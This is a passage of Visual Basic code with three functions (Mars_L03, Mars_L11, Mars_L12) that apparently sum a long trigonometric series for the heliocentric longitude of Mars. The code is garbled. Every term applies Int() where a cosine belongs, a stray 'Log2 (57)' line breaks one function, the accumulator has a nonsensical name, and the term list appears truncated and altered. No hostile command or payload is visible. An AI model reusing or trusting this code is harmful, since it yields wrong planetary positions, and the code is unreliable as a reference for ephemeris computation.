 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000053 * Int(4.65521663671 + 3448.2759506384 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000006 * Int(0.77450276964 + 3319.2767862328 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(1.45142985881 + 3547.3131639964 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(4.81258158513 + 4403.517475238 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(0.37366902835 + 3322.7999045818 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(4.68787711774 + 3253.30422216 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(4.63578431535 + 4694.0029547076 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000049 * Int(3.17471347671 + 5452.2627400774 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(2.54791773443 + 4001.8453534808 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000048 * Int(2.81171553464 + 3372.5847325166 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000054 * Int(4.45945188023 + 10284.9212034722 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000053 * Int(3.8513121352 + 9758.7533567266 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(1.11244863072 + 6901.6374958384 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000062 * Int(1.4219800963 + 6830.7880505342 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000055 * Int(5.6167298818 + 45494.5814297488 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000054 * Int(0.61701959453 + 4716.3862265456 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000054 * Int(4.28556326526 + 2910.4911174748 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000045 * Int(3.14626081312 + 13951.5145338074 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(4.16235480519 + 12979.553174576 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000046 * Int(1.66182208107 + 7768.0083396856 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000045 * Int(5.07701425888 + 14951.522602083 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(4.3172345953 + 5881.4037282342 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000045 * Int(2.39713581676 + 8852.2490286908 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(2.10202660495 + 3337.1566186536 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000048 * Int(0.19934255781 + 1905.4647649404 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000056 * Int(5.25687695855 + 12808.8803039568 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000049 * Int(2.06320966659 + 4296.9015826704 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(6.07282126953 + 4295.8539512994 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(1.7457161378 + 3130.8364496108 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(2.27112469544 + 3427.9206312396 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(0.30214747765 + 3358.4249488178 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(5.05297177283 + 3229.4257844122 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000054 * Int(6.11998016428 + 16894.5103996106 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(1.90603004035 + 3451.7990689874 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(0.50727886431 + 10011.2006147496 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000052 * Int(3.17851184154 + 2324.9494088156 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(4.88249540246 + 3499.555944483 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(5.28113083211 + 3343.1552239806 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(4.98185580267 + 3468.5639597344 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000047 * Int(2.16244218985 + 10027.3602044068 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000037 * Int(5.84953090935 + 6791.431174619 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000048 * Int(5.03779546898 + 7064.1041319706 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(0.58076516432 + 8966.3875031733 * Lite)
 
 Log2 (57)

 
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(3.36181117037 + 8976.6824439118 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(4.13725767158 + 8336.7851575978 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(5.75425648893 + 4531.5363185754 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(3.55681323215 + 5351.7127631396 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000004 * Int(2.79414141035 + 3067.9394693482 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000004 * Int(4.99798468494 + 10042.1925994982 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000037 * Int(1.82286411009 + 10017.9559447414 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000036 * Int(6.02115369796 + 6474.524116103 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000044 * Int(3.01299253859 + 7417.1013669314 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000045 * Int(2.33470159894 + 3123.7902129128 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000039 * Int(4.91767933978 + 8034.6153814074 * Lite)
Mars_L03 = OPOPOTAMIKUSE * 1
End Function
' ************************

Public Function Mars_L11(Lite)

' L1 Segment #1 of 2

 Dim OPOPOTAMIKUSE As Double
 OPOPOTAMIKUSE = 0#
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 3340.85627474342 * Int(0 + 0 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.01458227051 * Int(3.60426053609 + 3340.6124266998 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00164901343 * Int(3.92631250962 + 6681.2248533996 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00019963338 * Int(4.2659406103 + 10021.8372800994 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00003452399 * Int(4.73210386365 + 3.523118349 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000248548 * Int(4.61277567318 + 13362.4497067992 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000841551 * Int(4.45858256765 + 2281.2304965106 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000537566 * Int(5.01589727492 + 398.1490034082 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000521041 * Int(4.99422678175 + 3344.1355450488 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000432614 * Int(2.5606640286 + 191.4482661116 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000429656 * Int(5.31646162367 + 155.4203994342 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000381747 * Int(3.53881289437 + 796.2980068164 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000314129 * Int(4.96335266049 + 16703.062133499 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000282804 * Int(3.15967518204 + 2544.3144198834 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000205664 * Int(4.5689145566 + 2146.1654164752 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000168805 * Int(1.32894813366 + 3337.0893083508 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000133 * Int(0.34413768012 + 16489.763038061 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000098 * Int(1.44874403589 + 3370.0419352358 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000131 * Int(1.31336606248 + 3313.210870603 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000111 * Int(3.12463539337 + 309.2783226558 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000101 * Int(3.15369992044 + 24150.080051345 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000102 * Int(6.13479937096 + 2277.7073781616 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000099 * Int(0.10085261274 + 12839.8722887054 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000134 * Int(2.91637947295 + 57.8786960038 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000104 * Int(3.3028305233 + 3399.9862886134 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000108 * Int(4.92699760221 + 802.3639224462 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000106 * Int(2.89298330043 + 7799.9806455024 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000112 * Int(3.12761163915 + 5989.0672521728 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000094 * Int(3.42562596561 + 3510.1926098328 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000102 * Int(0.94285421551 + 3209.0704650134 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(0.79636181668 + 3024.2205570432 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000093 * Int(1.08979608844 + 14577.1847261198 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000097 * Int(3.56551535742 + 14421.8316369884 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000092 * Int(5.0227963751 + 2494.5295919486 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000123 * Int(5.83481108101 + 7747.7203305896 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000111 * Int(3.31406538379 + 11610.9101753832 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000118 * Int(5.0084532296 + 1581.959348283 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000091 * Int(2.36839307589 + 11140.5930722022 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000099 * Int(2.93269536697 + 2067.9314010726 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000124 * Int(3.15220420912 + 22345.2603761082 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000009 * Int(0.85462370851 + 17232.7530985936 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000125 * Int(1.54866979468 + 1435.1476617594 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000113 * Int(4.57220387105 + 14712.317116458 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000103 * Int(0.11158194413 + 11.0457002639 * Lite)
Mars_L11 = OPOPOTAMIKUSE * Lite
End Function
' ************************

Public Function Mars_L12(Lite)

' L1 Segment #2 of 2

 Dim OPOPOTAMIKUSE As Double
 OPOPOTAMIKUSE = 0#
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000113 * Int(2.41110151532 + 5244.049239201 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000091 * Int(1.7718473028 + 2221.856634597 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000114 * Int(1.92696878615 + 8226.5788363784 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000118 * Int(0.29322259611 + 2945.9865416406 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000089 * Int(4.49875865671 + 21947.1113727 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000104 * Int(1.36766858693 + 4032.7700279266 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000116 * Int(4.67476277278 + 272.6729573516 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000105 * Int(3.7332797385 + 4989.0591838972 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000095 * Int(0.34653808205 + 13517.8027959306 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000086 * Int(2.70925448214 + 7218.029365495 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000112 * Int(5.27572276726 + 17499.3601403154 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000114 * Int(3.37335971932 + 2938.9403049426 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000009 * Int(0.26623024836 + 9485.032768004 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000086 * Int(3.66786582491 + 6997.6167230562 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000087 * Int(4.0782360868 + 18606.4989460002 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000117 * Int(5.61863859185 + 16511.6138673874 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000084 * Int(2.80171829534 + 8584.6616659008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000086 * Int(5.87459621301 + 73.6009559152 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000009 * Int(1.07789160729 + 10721.108428327 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000084 * Int(0.78729386249 + 146.8116865236 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000112 * Int(2.31690430881 + 9638.9407478762 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000083 * Int(5.90575201511 + 16858.4152226304 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(4.316905577 + 9374.8264467846 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000083 * Int(1.41315204958 + 22854.596021804 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000084 * Int(0.90320571725 + 2171.0241752912 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(1.59442952041 + 9947.0556815321 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(0.44163602941 + 4782.87363546 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000086 * Int(5.18335054161 + 12410.7313005486 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000085 * Int(3.61669636863 + 8965.9784682592 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000097 * Int(5.3551176514 + 4996.172730898 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000085 * Int(2.36814442737 + 1062.9050485382 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(1.75580354602 + 2060.8178540718 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000087 * Int(0.98702744399 + 10156.9023601348 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000098 * Int(0.35294347682 + 23546.7536230308 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000101 * Int(1.03298143418 + 20040.1514418498 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000088 * Int(0.56201084357 + 17101.2111369072 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(2.65765057749 + 12979.553174576 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000085 * Int(1.07007237991 + 10706.8813343254 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(0.8058839632 + 20735.8321614256 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000092 * Int(4.87180501294 + 9389.0535407862 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(3.22869264518 + 11925.2740926006 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000074 * Int(5.59171946181 + 8535.8571590342 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000008 * Int(0.42260849968 + 956.2891559706 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(1.47379060963 + 16.83220104979 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000073 * Int(3.76950560688 + 8859.3625756916 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000073 * Int(4.5913018263 + 362.1211367308 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000072 * Int(5.15373872266 + 9872.2740829648 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000098 * Int(2.47740242208 + 5401.4302807716 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000071 * Int(0.08395696279 + 15849.865751747 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(0.04212599783 + 16703.1294438018 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000075 * Int(3.77172360793 + 4845.9002357928 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000072 * Int(2.01742377451 + 1329.51209026 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000076 * Int(0.30413402871 + 72.0557333548 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000097 * Int(5.1510931855 + 1.4844727083 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000007 * Int(0.33648335823 + 23141.5583829246 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(0.34828385806 + 20047.1976785478 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(1.42772075938 + 16063.164847185 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000081 * Int(2.37498404818 + 16703.0448798468 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000069 * Int(3.66727984195 + 13363.4300278674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(1.77194706681 + 18451.078546566 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000073 * Int(0.41181711796 + 33406.124266998 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(3.1594684038 + 8799.988713778 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(4.07602260745 + 10448.4354709754 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(1.78981361818 + 224.3447957019 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000066 * Int(1.01449371817 + 4193.8088084518 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(4.89249339125 + 12082.6551341712 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000081 * Int(0.61914094848 + 949.1756089698 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000066 * Int(3.39914635235 + 10184.3039162316 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000064 * Int(5.50528849889 + 4936.7988689844 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000064 * Int(1.8260823549 + 3077.528503327 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000069 * Int(2.48571574894 + 10018.2468514476 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000064 * Int(2.8044732232 + 20809.4676246452 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(0.9790733543 + 6717.252720077 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000087 * Int(2.45966764758 + 7321.1221397136 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000062 * Int(1.69131771765 + 632.7837393132 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000081 * Int(4.40575713075 + 16703.0793871512 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000063 * Int(3.63625395496 + 25685.872802808 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000075 * Int(5.54907590704 + 16872.642316632 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000061 * Int(0.33159827734 + 12012.5822971404 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000063 * Int(3.16314818302 + 11670.2840372968 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000062 * Int(0.23148800541 + 7314.0085927128 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(1.65377731167 + 11614.4332937322 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(1.10866475394 + 6155.057006654 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(4.45713540461 + 9175.7544453482 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000081 * Int(3.66553577428 + 15265.8865193004 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(5.59792852411 + 377.3736079158 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000059 * Int(6.25689995147 + 41427.4869831788 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000072 * Int(3.39739853142 + 685.1113645288 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000062 * Int(0.11206359088 + 14047.4937610252 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000057 * Int(4.31819630987 + 95.9792272178 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000007 * Int(5.98596344975 + 6531.661656265 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000066 * Int(5.93804470886 + 3490.1756238344 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000056 * Int(5.11205539684 + 7322.1024607818 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000056 * Int(3.36788837326 + 4379.6390374902 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000056 * Int(2.20908914878 + 6688.2710900976 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000057 * Int(4.57828186723 + 10037.0897512844 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000057 * Int(0.04695703833 + 24889.5747959916 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000065 * Int(2.70973517401 + 19617.0763693228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(3.51423189318 + 14556.8967170238 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000056 * Int(5.94452825242 + 21548.9623692918 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000056 * Int(3.94541346495 + 25665.5174834092 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000055 * Int(0.45166365461 + 16702.9948231962 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000062 * Int(0.05229160039 + 14061.7208550268 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000055 * Int(1.14774475393 + 4459.3682188026 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000065 * Int(6.21442820689 + 6947.8318951214 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000056 * Int(5.01712943722 + 485.9720527896 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000065 * Int(1.51615558729 + 5511.636601991 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000072 * Int(4.90742373357 + 25287.7237993998 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000057 * Int(5.31542907454 + 28628.3362260996 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000055 * Int(4.02023620788 + 4005.3684718298 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000054 * Int(5.51196184505 + 44.6538332402 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000053 * Int(0.46840976995 + 19645.5255567906 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000053 * Int(4.51539970261 + 9886.772200064 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000069 * Int(3.37092084432 + 41.5507909848 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000072 * Int(4.66520155151 + 6685.1061887576 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000052 * Int(2.05209599225 + 7366.2689076256 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000052 * Int(6.25882226723 + 12509.2533250472 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000006 * Int(0.33350021257 + 13575.7488022372 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000059 * Int(5.94433755684 + 625.6701923124 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(2.65624501709 + 10124.930054318 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(2.92105834159 + 10025.4277087512 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(2.88289068067 + 39601.8919124496 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000069 * Int(1.09637075565 + 24076.4445881254 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000052 * Int(2.65290577481 + 15650.7937503106 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000052 * Int(3.2868331301 + 6756.0064519669 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000054 * Int(5.34683925496 + 6578.132079181 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000054 * Int(2.77410607136 + 6705.1032911474 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000049 * Int(2.657002099 + 6944.3087767724 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000053 * Int(5.67436244967 + 1883.0814931024 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000048 * Int(5.68336050679 + 8646.0634802536 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000051 * Int(0.113906433 + 17402.3332817266 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000065 * Int(1.03099992649 + 4106.4054911462 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000006 * Int(1.00159365247 + 151.8972810852 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(3.84651247899 + 45494.5814297488 * Lite)
